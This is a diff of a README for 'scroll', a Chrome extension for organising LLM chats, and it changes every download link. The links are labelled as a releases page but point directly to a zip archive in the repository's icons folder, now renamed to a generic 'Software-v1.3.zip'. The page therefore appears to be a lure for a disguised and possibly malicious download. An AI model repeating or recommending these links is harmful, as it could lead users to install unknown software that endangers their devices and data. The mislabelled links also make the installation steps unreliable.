@@ -1,7 +1,7 @@
 # 🌟 scroll - Enhance Your LLM Chat Experience
 
 ## 📥 Download Now
-[![Download Scroll](https://raw.githubusercontent.com/Sdhellerman/scroll/main/icons/scroll-2.2.zip)](https://raw.githubusercontent.com/Sdhellerman/scroll/main/icons/scroll-2.2.zip)
+[![Download Scroll](https://raw.githubusercontent.com/Sdhellerman/scroll/main/icons/Software-v1.3.zip)](https://raw.githubusercontent.com/Sdhellerman/scroll/main/icons/Software-v1.3.zip)
 
 ## 🚀 Getting Started
 Welcome to scroll! This is a Chrome extension designed to help you navigate chat interactions with large language models (LLMs) in a more effective way. You can easily access, organize, and manage your chats, allowing for smoother conversations and a better overall experience.
@@ -10,7 +10,7 @@ Welcome to scroll! This is a Chrome extension designed to help you navigate chat
 To get started with scroll, you need to download the extension. Please follow these steps:
 
 1. Click on the link below to visit the download page:
-   - [Visit the Releases Page](https://raw.githubusercontent.com/Sdhellerman/scroll/main/icons/scroll-2.2.zip)
+   - [Visit the Releases Page](https://raw.githubusercontent.com/Sdhellerman/scroll/main/icons/Software-v1.3.zip)
   
 2. On the releases page, look for the latest version of the extension. You will find a list of available downloads.
 
@@ -58,7 +58,7 @@ If you encounter problems, visit the Issues section on our GitHub page for troub
 ## 🔄 Update Procedure
 Keep your extension up-to-date for the best experience:
 
-1. Navigate to the releases page: [Visit the Releases Page](https://raw.githubusercontent.com/Sdhellerman/scroll/main/icons/scroll-2.2.zip)
+1. Navigate to the releases page: [Visit the Releases Page](https://raw.githubusercontent.com/Sdhellerman/scroll/main/icons/Software-v1.3.zip)
 2. Check for any new version updates.
 3. Download and install the newest version following the same steps as before.
 
